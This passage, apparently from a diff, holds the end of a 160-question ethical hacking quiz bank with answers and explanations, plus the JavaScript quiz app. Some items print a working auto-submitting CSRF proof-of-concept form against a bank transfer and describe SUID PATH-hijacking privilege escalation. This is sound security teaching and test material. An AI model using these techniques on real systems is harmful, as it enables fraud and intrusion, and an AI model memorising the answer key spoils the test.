security analyst monitors firewall logs and flags an internal workstation establishing an outbound TCP connection on port 4444 to an external IP. Why does port 4444 immediately raise severe suspicion?", "options": ["Port 4444 is the well-known default listening port for Metasploit reverse shells", "Port 4444 is reserved by the IANA exclusively for encrypted domain name resolution", "Port 4444 is the default port used by Microsoft Windows Update to deliver patches", "Port 4444 indicates that the client workstation has run out of heap memory space"], "answer": 0, "explanation": "Port 4444 is infamous as Metasploit's default payload listening port (multi/handler). Any outbound connection to port 4444 on an enterprise network is a massive red flag indicating a likely reverse shell connection."}, {"id": 148, "difficulty": "Scenario", "unit": "Unit II", "topic": "System Hardening - SSH Configuration", "question": "A network audit discovers an SSH server allowing direct 'root' login with password authentication enabled over the public Internet. What two hardening recommendations should the tester provide?", "options": ["Disable the Linux kernel firewall and permit all incoming ICMP redirect packets", "Change the root password to 'admin123' and disable all system event logging", "Set 'PermitRootLogin no' and enforce public-key authentication in sshd_config", "Set 'Port 22' to 'Port 21' and enable anonymous FTP authentication on the server"], "answer": 2, "explanation": "Best-practice SSH hardening requires disabling direct root login ('PermitRootLogin no' forces users to log in with unprivileged accounts and use sudo) and disabling password auth in favor of cryptographic SSH keys."}, {"id": 149, "difficulty": "Scenario", "unit": "Unit V", "topic": "Risk Heat Map Analysis", "question": "A vulnerability requires physical hardware disassembly of a server inside a locked data center (Low Likelihood), but if exploited, allows extracting private encryption keys (High Impact). Where does this sit on a Risk Heat Map?", "options": ["Low to Medium overall risk; low likelihood of physical access moderates high impact", "Extreme risk; physical vulnerabilities automatically override all digital controls", "Critical overall risk; high impact vulnerabilities must always be rated Critical", "Informational risk; physical vulnerabilities are never documented in VAPT reports"], "answer": 0, "explanation": "Risk is a function of Likelihood × Impact. When likelihood is extremely low (requiring physical access to a high-security facility), the overall calculated risk is moderated down to Medium or Low."}, {"id": 150, "difficulty": "Scenario", "unit": "Unit V", "topic": "Remediation Triage Decisions", "question": "A client has budget to remediate only one of two findings this week: (1) An unauthenticated RCE on a non-sensitive internal dev VM, or (2) An unauthenticated SQLi on their public-facing customer portal. Which should be prioritized?", "options": ["The internal dev VM RCE, because code execution is alphabetically ranked higher", "Neither should be fixed until both can be patched simultaneously during downtime", "The dev VM, because development systems have fewer software developers reviewing logs", "The customer portal SQLi; it is exposed to the Internet and threatens customer data"], "answer": 3, "explanation": "Threat exposure and business impact drive triage: the customer portal is directly exposed to external internet threat actors and holds sensitive live customer data, posing an immediate existential threat to the business."}, {"id": 151, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Penetration Testing - CSRF Demo", "question": "A tester creates an HTML proof-of-concept page: '<form action=\"http://bank.com/transfer\" method=\"POST\"><input name=\"amount\" value=\"1000\"><input name=\"to\" value=\"attacker\"><\/form><script>document.forms[0].submit();<\/script>'. What attack does this demonstrate?", "options": ["A Denial of Service attack exhausting backend database connection worker threads", "A Clickjacking attack modifying CSS display coordinates of web application buttons", "Cross-Site Request Forgery (CSRF) triggering unauthorized transfers when viewed", "A Local File Inclusion attack extracting the web server's Apache configuration file"], "answer": 2, "explanation": "This PoC automatically submits a state-changing POST request to the bank using JavaScript. If a logged-in bank customer visits this malicious page, their browser automatically sends their session cookie, executing the transfer (CSRF)."}, {"id": 152, "difficulty": "Scenario", "unit": "Unit I", "topic": "VAPT Methodology Justification", "question": "A client asks: 'Why do we need to hire human penetration testers when we already run automated Nessus vulnerability scans every Sunday night?'. What is the most accurate technical justification?", "options": ["Automated scanners only function when connected to dial-up analog modem circuits", "Human penetration testers use secret tools that are illegal for vendors to develop", "Automated vulnerability scanners are legally banned from scanning financial networks", "Scanners cannot evaluate business logic, chain multi-step exploits, or verify impact"], "answer": 3, "explanation": "Vulnerability scanners identify known signatures and version banners, but produce false positives and cannot evaluate business logic (like IDOR, workflow bypasses, or multi-stage exploit chaining), which requires skilled human penetration testing."}, {"id": 153, "difficulty": "Scenario", "unit": "Unit II", "topic": "Web Security Misconfiguration - Directory Listing", "question": "Navigating to 'http://target.com/uploads/' displays an Apache index page listing all uploaded files, including user-submitted PDF passports and invoice spreadsheets. What configuration change resolves this issue?", "options": ["Change the web server's primary IP address from IPv4 to IPv6", "Configure the web application firewall to block all incoming HTTP GET requests", "Disable the Indexes option in Apache ('Options -Indexes') or add an empty index.html", "Enable the 'Indexes' option and grant world-readable execute permissions to uploads"], "answer": 2, "explanation": "Directory listing occurs when no default index file (index.html/index.php) exists and the web server allows indexing. In Apache, disabling the Indexes option ('Options -Indexes') returns an HTTP 403 Forbidden instead of listing directory contents."}, {"id": 154, "difficulty": "Scenario", "unit": "Unit III", "topic": "Linux Privilege Escalation - SUID Binaries", "question": "A tester runs 'find / -perm -4000 -type f 2>/dev/null' and spots an unusual custom binary: '/usr/local/bin/backup_tool' with SUID root. Running 'strings' on it reveals it calls the unquoted command 'tar -czf ...'. How can this be exploited?", "options": ["Exploit PATH hijacking: place a script named 'tar' in '/tmp' and prepend '/tmp' to PATH", "Transmit an oversized UDP packet to the local loopback interface on port 111", "Recompile the Linux kernel using the GNU C Compiler to strip the SUID bit", "Modify the system hardware BIOS clock to simulate an expired digital certificate"], "answer": 0, "explanation": "If a privileged SUID binary invokes a system command ('tar') without specifying an absolute path ('/bin/tar'), it relies on the user's PATH environment variable. An attacker places a malicious 'tar' in /tmp and prepends /tmp to PATH to gain root execution."}, {"id": 155, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Authentication Hardening - Brute Force", "question": "During an assessment, a tester uses Burp Intruder to test 5,000 passwords against an administrative login portal without encountering any CAPTCHA, lockout, or delay. What defense should be recommended?", "options": ["Disable SSL/TLS encryption to allow network firewalls to inspect password characters", "Implement progressive account lockout policies, rate limiting, and MFA", "Convert the login web form to use the HTTP GET method instead of HTTP POST", "Store all user account passwords in plaintext within browser local storage cookies"], "answer": 1, "explanation": "To defend against online credential stuffing and brute-force attacks, applications must implement rate limiting, temporary account lockouts after consecutive failed attempts, CAPTCHAs, and Multi-Factor Authentication (MFA)."}, {"id": 156, "difficulty": "Scenario", "unit": "Unit V", "topic": "CVSS v3.1 Metric Analysis - User Interaction", "question": "A vulnerability in a file parsing daemon previously required a local administrator to manually open a crafted file (User Interaction: Required). A tester discovers a network vector that triggers parsing automatically (User Interaction: None). How does this affect the CVSS Base Score?", "options": ["Base Score converts automatically into a qualitative Informational (0.0) rating", "Base Score increases significantly because the attack requires no victim interaction", "Base Score decreases because removing user interaction simplifies the architecture", "Base Score remains unchanged because User Interaction has zero mathematical weighting"], "answer": 1, "explanation": "In CVSS v3.1, changing User Interaction from Required (UI:R) to None (UI:N) significantly raises the Exploitability sub-score, reflecting that the attack requires no human cooperation and can be executed reliably and autonomously."}, {"id": 157, "difficulty": "Scenario", "unit": "Unit I", "topic": "Vulnerability Handling - Critical Zero-Day", "question": "On Day 2 of a planned 10-day penetration test, a tester uncovers an active, unauthenticated remote code execution vulnerability on the client's core production payment gateway. How should this finding be handled?", "options": ["Wait until Day 10 and include it quietly inside the final 200-page PDF report document", "Keep the vulnerability secret and sell the exploit to an offshore research consortium", "Exploit the gateway fully to siphon payment transactions to test fraud detection", "Issue an immediate out-of-band Critical Vulnerability Advisory to client contacts"], "answer": 3, "explanation": "Critical vulnerabilities posing immediate existential threats to client operations must not wait for the final report delivery. Professional protocol dictates issuing an immediate emergency interim advisory so the client can patch immediately."}, {"id": 158, "difficulty": "Scenario", "unit": "Unit I", "topic": "Post-Engagement Cleanup", "question": "A penetration test concludes successfully. During testing, the team uploaded PHP webshells, created test user accounts ('test_admin1'), and planted cron jobs. What is their final mandatory responsibility before delivering the report?", "options": ["Change all administrative passwords to prevent the client from accessing systems", "Format the web server hard drives to ensure no residual testing artifacts remain", "Perform cleanup: remove uploaded webshells, delete test accounts, revert changes", "Leave webshells in place so that the client's internal team can test detections"], "answer": 2, "explanation": "Post-engagement cleanup is a core requirement of professional penetration testing standards (PTES Phase 6/7). Leaving webshells or backdoor accounts behind introduces severe security vulnerabilities that malicious third parties could discover and exploit."}, {"id": 159, "difficulty": "Scenario", "unit": "Unit V", "topic": "Remediation Verification - Retesting", "question": "One month after delivering a VAPT report with 15 findings, the client requests a retest. The tester finds that the client disabled the vulnerable web page URL but left the vulnerable backend API endpoint active and reachable. How should the tester report this?", "options": ["Mark as 'Partially Remediated' or 'Open'; hiding the UI leaves the backend API vulnerable", "Mark as 'Fully Remediated' because regular users can no longer click the button", "File a formal criminal police complaint against the client for improper patching", "Delete the vulnerability from the retest report to maintain good client relations"], "answer": 0, "explanation": "Merely hiding a frontend user interface without remediating the backend endpoint leaves the vulnerability fully exploitable by any attacker interacting with the API directly. The finding remains active/open."}, {"id": 160, "difficulty": "Scenario", "unit": "Unit V", "topic": "VAPT Report Deliverables", "question": "What is the final, comprehensive deliverable that an ethical hacker must provide to a client at the conclusion of an authorized penetration testing engagement?", "options": ["A public social media post certifying that the client organization is unhackable", "An invoice for billable consulting hours without technical explanations or guidance", "A formal VAPT report with Executive Summary, Scope, Findings with CVSS, and Remediation", "A raw dump of all proprietary client customer database tables on an unencrypted USB"], "answer": 2, "explanation": "The ultimate deliverable of any professional VAPT engagement is the formal report, structured with an Executive Summary for management, technical vulnerability descriptions with CVSS scores and PoCs for engineers, and prioritized remediation steps."}];
+
+    // Application State
+    let currentIndex = 0;
+    let userAnswers = {};   // { qId: optionIndex (0-3) }
+    let flaggedQuestions = new Set();
+    let currentMode = "practice"; // "practice" or "exam"
+    let isSubmitted = false;
+    let timerSeconds = 0;
+    let timerRunning = true;
+    let timerInterval = null;
+
+    // Initialize application
+    window.addEventListener("DOMContentLoaded", () => {
+      loadSavedState();
+      initTimer();
+      renderPalette();
+      renderQuestion(currentIndex);
+      updateProgress();
+    });
+
+    // Timer logic
+    function initTimer() {
+      timerInterval = setInterval(() => {
+        if (timerRunning) {
+          timerSeconds++;
+          updateTimerDisplay();
+        }
+      }, 1000);
+    }
+
+    function toggleTimer() {
+      timerRunning = !timerRunning;
+      const btn = document.getElementById("btnTimerToggle");
+      if (timerRunning) {
+        btn.innerHTML = `<svg viewBox="0 0 24 24" style="width:14px;height:14px;fill:currentColor;"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>`;
+        btn.title = "Pause Timer";
+      } else {
+        btn.innerHTML = `<svg viewBox="0 0 24 24" style="width:14px;height:14px;fill:currentColor;"><path d="M8 5v14l11-7z"/></svg>`;
+        btn.title = "Resume Timer";
+      }
+    }
+
+    function updateTimerDisplay() {
+      const hrs = Math.floor(timerSeconds / 3600);
+      const mins = Math.floor((timerSeconds % 3600) / 60);
+      const secs = timerSeconds % 60;
+      document.getElementById("timerDisplay").textContent = 
+        `${String(hrs).padStart(2, "0")}:${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+    }
+
+    // Mode Switching
+    function setMode(mode) {
+      currentMode = mode;
+      document.getElementById("btnModePractice").classList.toggle("active", mode === "practice");
+      document.getElementById("btnModeExam").classList.toggle("active", mode === "exam");
+      renderQuestion(currentIndex);
+    }
+
+    // Render Question
+    function renderQuestion(index) {
+      currentIndex = index;
+      const q = QUESTIONS[index];
+
+      // Update question badges and titles
+      document.getElementById("qNumberText").textContent = `Question ${q.id} of 160`;
+      
+      const diffBadge = document.getElementById("qDiffBadge");
+      diffBadge.textContent = q.difficulty;
+      diffBadge.className = "badge";
+      if (q.difficulty === "Simple") diffBadge.classList.add("badge-simple");
+      else if (q.difficulty === "Medium") diffBadge.classList.add("badge-medium");
+      else if (q.difficulty === "Hard") diffBadge.classList.add("badge-hard");
+      else diffBadge.classList.add("badge-scenario");
+
+      document.getElementById("qUnitBadge").textContent = q.unit;
+      document.getElementById("qTopicText").textContent = q.topic;
+
+      // Question Prompt
+      document.getElementById("qPromptText").innerHTML = escapeHtml(q.question);
+
+      // Flag / Bookmark button
+      const flagBtn = document.getElementById("btnFlagQuestion");
+      const isFlagged = flaggedQuestions.has(q.id);
+      flagBtn.classList.toggle("flagged", isFlagged);
+      document.getElementById("flagText").textContent = isFlagged ? "Marked" : "Mark for Review";
+
+      // Options Rendering
+      const container = document.getElementById("optionsContainer");
+      container.innerHTML = "";
+
+      const selectedOpt = userAnswers[q.id];
+      const hasAnswered = selectedOpt !== undefined;
+      const showAnswersNow = isSubmitted || (currentMode === "practice" && hasAnswered);
+
+      const letters = ["A", "B", "C", "D"];
+      q.options.forEach((optText, optIdx) => {
+        const card = document.createElement("div");
+        card.className = "option-card";
+        if (selectedOpt === optIdx) card.classList.add("selected");
+
+        if (showAnswersNow) {
+          card.classList.add("locked");
+          if (optIdx === q.answer) {
+            card.classList.add("is-correct");
+          } else if (selectedOpt === optIdx && optIdx !== q.answer) {
+            card.classList.add("is-incorrect");
+          }
+        }
+
+        card.onclick = () => {
+          if (!isSubmitted) {
+            selectOption(q.id, optIdx);
+          }
+        };
+
+        card.innerHTML = `
+          <div class="opt-letter">${letters[optIdx]}</div>
+          <div class="opt-text">${escapeHtml(optText)}</div>
+        `;
+        container.appendChild(card);
+      });
+
+      // Explanation box
+      const expContainer = document.getElementById("explanationContainer");
+      if (showAnswersNow) {
+        expContainer.classList.add("visible");
+        document.getElementById("explanationText").innerHTML = escapeHtml(q.explanation);
+      } else {
+        expContainer.classList.remove("visible");
+      }
+
+      // Navigation Buttons State
+      document.getElementById("btnPrev").disabled = (currentIndex === 0);
+      document.getElementById("btnNext").innerHTML = (currentIndex === QUESTIONS.length - 1)
+        ? `Finish <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>`
+        : `Next <svg viewBox="0 0 24 24" style="width:16px;height:16px;fill:currentColor;"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>`;
+
+      updatePaletteCurrent(index);
+      saveState();
+    }
+
+    function selectOption(qId, optIdx) {
+      userAnswers[qId] = optIdx;
+      renderQuestion(currentIndex);
+      updatePaletteButton(currentIndex);
+      updateProgress();
+    }
+
+    function clearCurrentSelection() {
+      const q = QUESTIONS[currentIndex];
+      if (userAnswers[q.id] !== undefined) {
+        delete userAnswers[q.id];
+        renderQuestion(currentIndex);
+        updatePaletteButton(currentIndex);
+        updateProgress();
+      }
+    }
+
+    function toggleFlagCurrentQuestion() {
+      const qId = QUESTIONS[currentIndex].id;
+      if (flaggedQuestions.has(qId)) {
+        flaggedQuestions.delete(qId);
+      } else {
+        flaggedQuestions.add(qId);
+      }
+      renderQuestion(currentIndex);
+      updatePaletteButton(currentIndex);
+    }
+
+    function nextQuestion() {
+      if (currentIndex < QUESTIONS.length - 1) {
+        renderQuestion(currentIndex + 1);
+      } else {
+        confirmSubmitExam();
+      }
+    }
+
+    function prevQuestion() {
+      if (currentIndex > 0) {
+        renderQuestion(currentIndex - 1);
+      }
+    }
+
+    // Palette Generation and Filtering
+    function renderPalette() {
+      const grid = document.getElementById("paletteGrid");
+      grid.innerHTML = "";
+
+      QUESTIONS.forEach((q, idx) => {
+        const btn = document.createElement("button");
+        btn.id = `paletteBtn_${idx}`;
+        btn.className = "palette-btn";
+        btn.textContent = q.id;
+        btn.title = `Q${q.id}: ${q.topic} (${q.difficulty})`;
+
+        btn.onclick = () => {
+          renderQuestion(idx);
+          if (document.getElementById("reviewView").classList.contains("active")) {
+            returnToTest();
+          }
+        };
+
+        grid.appendChild(btn);
+        updatePaletteButton(idx);
+      });
+      updatePaletteCurrent(currentIndex);
+    }
+
+    function updatePaletteButton(idx) {
+      const q = QUESTIONS[idx];
+      const btn = document.getElementById(`paletteBtn_${idx}`);
+      if (!btn) return;
+
+      btn.className = "palette-btn";
+      if (idx === currentIndex) btn.classList.add("current");
+      if (flaggedQuestions.has(q.id)) btn.classList.add("flagged");
+
+      const ans = userAnswers[q.id];
+      if (ans !== undefined) {
+        btn.classList.add("answered");
+        if (isSubmitted) {
+          if (ans === q.answer) btn.classList.add("is-correct");
+          else btn.classList.add("is-incorrect");
+        }
+      }
+    }
+
+    function updatePaletteCurrent(activeIdx) {
+      QUESTIONS.forEach((_, idx) => {
+        const btn = document.getElementById(`paletteBtn_${idx}`);
+        if (btn) {
+          btn.classList.toggle("current", idx === activeIdx);
+        }
+      });
+    }
+
+    function filterPalette(filterVal) {
+      QUESTIONS.forEach((q, idx) => {
+        const btn = document.getElementById(`paletteBtn_${idx}`);
+        if (!btn) return;
+
+        let visible = true;
+        const ans = userAnswers[q.id];
+        const isFlagged = flaggedQuestions.has(q.id);
+
+        if (filterVal === "answered") visible = (ans !== undefined);
+        else if (filterVal === "unanswered") visible = (ans === undefined);
+        else if (filterVal === "flagged") visible = isFlagged;
+        else if (filterVal === "Simple" || filterVal === "Medium" || filterVal === "Hard" || filterVal === "Scenario") {
+          visible = (q.difficulty === filterVal);
+        } else if (filterVal.startsWith("Unit")) {
+          visible = (q.unit === filterVal);
+        }
+
+        btn.style.display = visible ? "flex" : "none";
+      });
+    }
+
+    // Progress Bar
+    function updateProgress() {
+      const answeredCount = Object.keys(userAnswers).length;
+      document.getElementById("progressAnswered").textContent = answeredCount;
+      const pct = Math.round((answeredCount / QUESTIONS.length) * 100);
+      document.getElementById("progressPercent").textContent = `${pct}%`;
+      document.getElementById("progressBarFill").style.width = `${pct}%`;
+    }
+
+    // Submit & Scorecard Calculation
+    function confirmSubmitExam() {
+      const answeredCount = Object.keys(userAnswers).length;
+      const text = `You have answered ${answeredCount} of ${QUESTIONS.length} questions (${QUESTIONS.length - answeredCount} unattempted). Are you ready to finish the test and view your scorecard?`;
+      document.getElementById("confirmModalText").textContent = text;
+      document.getElementById("confirmModal").classList.add("active");
+    }
+
+    function closeConfirmModal() {
+      document.getElementById("confirmModal").classList.remove("active");
+    }
+
+    function submitExamConfirmed() {
+      closeConfirmModal();
+      isSubmitted = true;
+      calculateScore();
+      document.getElementById("scoreModal").classList.add("active");
+      renderQuestion(currentIndex);
+      renderPalette();
+    }
+
+    function calculateScore() {
+      let correct = 0;
+      let diffStats = {
+        Simple: { total: 35, correct: 0 },
+        Medium: { total: 35, correct: 0 },
+        Hard: { total: 30, correct: 0 },
+        Scenario: { total: 60, correct: 0 }
+      };
+
+      let unitStats = {
+        "Unit I": { total: 0, correct: 0 },
+        "Unit II": { total: 0, correct: 0 },
+        "Unit III": { total: 0, correct: 0 },
+        "Unit IV": { total: 0, correct: 0 },
+        "Unit V": { total: 0, correct: 0 }
+      };
+
+      QUESTIONS.forEach(q => {
+        if (unitStats[q.unit]) unitStats[q.unit].total++;
+        const userChoice = userAnswers[q.id];
+        if (userChoice !== undefined && userChoice === q.answer) {
+          correct++;
+          if (diffStats[q.difficulty]) diffStats[q.difficulty].correct++;
+          if (unitStats[q.unit]) unitStats[q.unit].correct++;
+        }
+      });
+
+      const totalAttempted = Object.keys(userAnswers).length;
+      const incorrect = totalAttempted - correct;
+      const pct = Math.round((correct / QUESTIONS.length) * 1000) / 10;
+
+      // Update Modal
+      document.getElementById("modalScoreText").textContent = `${correct} / 160`;
+      document.getElementById("modalPercentageText").textContent = `${pct}% Accuracy`;
+
+      let grade = "Needs Improvement (Keep Practicing)";
+      if (pct >= 85) grade = "Distinction / Master Penetration Tester";
+      else if (pct >= 70) grade = "First Class / Senior Security Analyst";
+      else if (pct >= 55) grade = "Second Class / Junior Pentester";
+      else if (pct >= 40) grade = "Pass / Associate Security Auditor";
+      document.getElementById("modalGradeText").textContent = grade;
+
+      document.getElementById("statAttempted").textContent = totalAttempted;
+      document.getElementById("statCorrect").textContent = correct;
+      document.getElementById("statIncorrect").textContent = incorrect;
+
+      const hrs = Math.floor(timerSeconds / 3600);
+      const mins = Math.floor((timerSeconds % 3600) / 60);
+      const secs = timerSeconds % 60;
+      document.getElementById("statTimeSpent").textContent = 
+        hrs > 0 ? `${hrs}h ${mins}m` : `${mins}m ${secs}s`;
+
+      document.getElementById("catSimpleScore").textContent = `${diffStats.Simple.correct} / ${diffStats.Simple.total} (${Math.round(diffStats.Simple.correct / diffStats.Simple.total * 100)}%)`;
+      document.getElementById("catMediumScore").textContent = `${diffStats.Medium.correct} / ${diffStats.Medium.total} (${Math.round(diffStats.Medium.correct / diffStats.Medium.total * 100)}%)`;
+      document.getElementById("catHardScore").textContent = `${diffStats.Hard.correct} / ${diffStats.Hard.total} (${Math.round(diffStats.Hard.correct / diffStats.Hard.total * 100)}%)`;
+      document.getElementById("catScenarioScore").textContent = `${diffStats.Scenario.correct} / ${diffStats.Scenario.total} (${Math.round(diffStats.Scenario.correct / diffStats.Scenario.total * 100)}%)`;
+
+      document.getElementById("unit1Score").textContent = `${unitStats["Unit I"].correct} / ${unitStats["Unit I"].total}`;
+      document.getElementById("unit2Score").textContent = `${unitStats["Unit II"].correct} / ${unitStats["Unit II"].total}`;
+      document.getElementById("unit3Score").textContent = `${unitStats["Unit III"].correct} / ${unitStats["Unit III"].total}`;
+      document.getElementById("unit4Score").textContent = `${unitStats["Unit IV"].correct} / ${unitStats["Unit IV"].total}`;
+      document.getElementById("unit5Score").textContent = `${unitStats["Unit V"].correct} / ${unitStats["Unit V"].total}`;
+    }
+
+    function closeModal() {
+      document.getElementById("scoreModal").classList.remove("active");
+    }
+
+    function retakeExam() {
+      if (confirm("Reset all answers and retake the quiz from the beginning?")) {
+        userAnswers = {};
+        flaggedQuestions.clear();
+        isSubmitted = false;
+        timerSeconds = 0;
+        closeModal();
+        returnToTest();
+        renderPalette();
+        renderQuestion(0);
+        updateProgress();
+        saveState();
+      }
+    }
+
+    // Review List Rendering
+    function viewFullReview() {
+      closeModal();
+      document.getElementById("quizContainer").style.display = "none";
+      document.getElementById("paletteSidebar").style.display = "none";
+      const reviewView = document.getElementById("reviewView");
+      reviewView.classList.add("active");
+      renderReviewList("all");
+    }
+
+    function returnToTest() {
+      document.getElementById("reviewView").classList.remove("active");
+      document.getElementById("quizContainer").style.display = "flex";
+      document.getElementById("paletteSidebar").style.display = "flex";
+    }
+
+    function renderReviewList(filterType) {
+      const container = document.getElementById("reviewListContainer");
+      container.innerHTML = "";
+
+      const letters = ["A", "B", "C", "D"];
+
+      QUESTIONS.forEach(q => {
+        const userChoice = userAnswers[q.id];
+        const isAnswered = userChoice !== undefined;
+        const isCorrect = isAnswered && (userChoice === q.answer);
+        const isFlagged = flaggedQuestions.has(q.id);
+
+        if (filterType === "correct" && !isCorrect) return;
+        if (filterType === "incorrect" && (!isAnswered || isCorrect)) return;
+        if (filterType === "flagged" && !isFlagged) return;
+
+        let statusClass = "status-unanswered";
+        let statusBadge = `<span class="badge" style="background:#334155;color:#94a3b8;">Unanswered</span>`;
+        if (isAnswered) {
+          if (isCorrect) {
+            statusClass = "status-correct";
+            statusBadge = `<span class="badge badge-simple">Correct (+1)</span>`;
+          } else {
+            statusClass = "status-incorrect";
+            statusBadge = `<span class="badge badge-hard">Incorrect (0)</span>`;
+          }
+        }
+
+        const item = document.createElement("div");
+        item.className = `review-item ${statusClass}`;
+
+        let optionsHtml = "";
+        q.options.forEach((opt, optIdx) => {
+          let optStyle = "background:var(--bg-card); border:1px solid var(--border-color);";
+          let letterStyle = "background:var(--bg-secondary); color:var(--text-secondary);";
+          
+          if (optIdx === q.answer) {
+            optStyle = "background:var(--color-success-bg); border:1px solid var(--color-success); font-weight:600;";
+            letterStyle = "background:var(--color-success); color:#fff;";
+          } else if (userChoice === optIdx && optIdx !== q.answer) {
+            optStyle = "background:var(--color-error-bg); border:1px solid var(--color-error);";
+            letterStyle = "background:var(--color-error); color:#fff;";
+          }
+
+          optionsHtml += `
+            <div style="display:flex; align-items:center; gap:10px; padding:10px 14px; border-radius:6px; margin-bottom:6px; ${optStyle}">
+              <span style="width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.75rem; font-weight:700; ${letterStyle}">${letters[optIdx]}</span>
+              <span style="font-size:0.9rem;">${escapeHtml(opt)}</span>
+              ${optIdx === q.answer ? '<span style="margin-left:auto; font-size:0.75rem; font-weight:700; color:var(--color-success);">✓ CORRECT ANSWER</span>' : ''}
+              ${userChoice === optIdx && optIdx !== q.answer ? '<span style="margin-left:auto; font-size:0.75rem; font-weight:700; color:var(--color-error);">✗ YOUR CHOICE</span>' : ''}
+            </div>
+          `;
+        });
+
+        item.innerHTML = `
+          <div style="display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap;">
+            <div style="display:flex; align-items:center; gap:8px;">
+              <strong>Question ${q.id}</strong>
+              <span class="badge badge-unit">${q.unit}</span>
+              <span class="badge badge-scenario">${q.difficulty}</span>
+              <span style="font-size:0.8rem; color:var(--text-muted);">${q.topic}</span>
+            </div>
+            <div>${statusBadge}</div>
+          </div>
+
+          <div style="font-size:1.05rem; font-weight:500; margin:6px 0 10px;">${escapeHtml(q.question)}</div>
+
+          <div>${optionsHtml}</div>
+
+          <div style="background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); border-radius:8px; padding:12px 16px; margin-top:8px;">
+            <div style="font-size:0.78rem; font-weight:700; text-transform:uppercase; color:var(--accent-cyan); margin-bottom:4px;">Explanation & Reference</div>
+            <div style="font-size:0.88rem; line-height:1.5; color:#cbd5e1;">${escapeHtml(q.explanation)}</div>
+          </div>
+        `;
+
+        container.appendChild(item);
+      });
+    }
+
+    function filterReview(type, btn) {
+      document.querySelectorAll(".review-filter-btn").forEach(b => b.classList.remove("active"));
+      if (btn) btn.classList.add("active");
+      renderReviewList(type);
+    }
+
+    // LocalStorage State Persistence
+    function saveState() {
+      try {
+        const state = {
+          userAnswers,
+          flagged: Array.from(flaggedQuestions),
+          currentIndex,
+          currentMode,
+          isSubmitted,
+          timerSeconds
+        };
+        localStorage.setItem("EH_QUIZ_160_STATE", JSON.stringify(state));
+      } catch (e) {}
+    }
+
+    function loadSavedState() {
+      try {
+        const raw = localStorage.getItem("EH_QUIZ_160_STATE");
+        if (raw) {
+          const state = JSON.parse(raw);
+          if (state.userAnswers) userAnswers = state.userAnswers;
+          if (state.flagged) flaggedQuestions = new Set(state.flagged);
+          if (state.currentIndex) currentIndex = state.currentIndex;
+          if (state.currentMode) currentMode = state.currentMode;
+          if (state.isSubmitted) isSubmitted = state.isSubmitted;
+          if (state.timerSeconds) timerSeconds = state.timerSeconds;
+          document.getElementById("btnModePractice").classList.toggle("active", currentMode === "practice");
+          document.getElementById("btnModeExam").classList.toggle("active", currentMode === "exam");
+        }
+      } catch (e) {}
+    }
+
+    // Keyboard Shortcuts
+    document.addEventListener("keydown", e => {
+      if (document.getElementById("scoreModal").classList.contains("active") ||
+          document.getElementById("confirmModal").classList.contains("active")) return;
+
+      if (e.key === "ArrowRight") {
+        nextQuestion();
+      } else if (e.key === "ArrowLeft") {
+        prevQuestion();
+      } else if (["1", "2", "3", "4"].includes(e.key)) {
+        const optIdx = parseInt(e.key) - 1;
+        selectOption(QUESTIONS[currentIndex].id, optIdx);
+      } else if (["a", "b", "c", "d"].includes(e.key.toLowerCase())) {
+        const map = { "a": 0, "b": 1, "c": 2, "d": 3 };
+        selectOption(QUESTIONS[currentIndex].id, map[e.key.toLowerCase()]);
+      } else if (e.key.toLowerCase() === "m") {
+        toggleFlagCurrentQuestion();
+      } else if (e.key === " ") {
+        clearCurrentSelection();
+      }
+    });
+
+    // Utility: HTML Escaping
+    function escapeHtml(str) {
+      if (!str) return "";
+      return str
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+  </script>
+</body>
+</html>
